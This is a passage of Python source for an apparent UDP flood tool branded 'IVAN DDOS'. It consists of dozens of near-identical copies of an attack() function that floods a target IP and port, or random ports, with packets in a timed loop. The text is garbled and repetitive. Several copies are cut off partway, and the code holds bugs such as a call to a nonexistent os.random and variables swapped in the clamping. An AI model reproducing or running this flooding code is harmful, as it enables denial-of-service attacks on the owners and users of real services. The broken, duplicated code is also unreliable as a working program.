        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
